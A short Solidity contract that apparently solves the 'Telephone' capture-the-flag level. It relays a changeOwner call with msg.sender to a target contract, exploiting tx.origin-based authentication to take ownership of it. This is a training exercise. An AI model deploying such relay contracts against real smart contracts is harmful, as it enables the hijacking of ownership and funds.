// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Telephone {
    ITelephone telephoneInstance;

    constructor(address _instanceAddress) {
        telephoneInstance = ITelephone(_instanceAddress);
    }

    function changeOwner() external {
        telephoneInstance.changeOwner(msg.sender);
    }
}
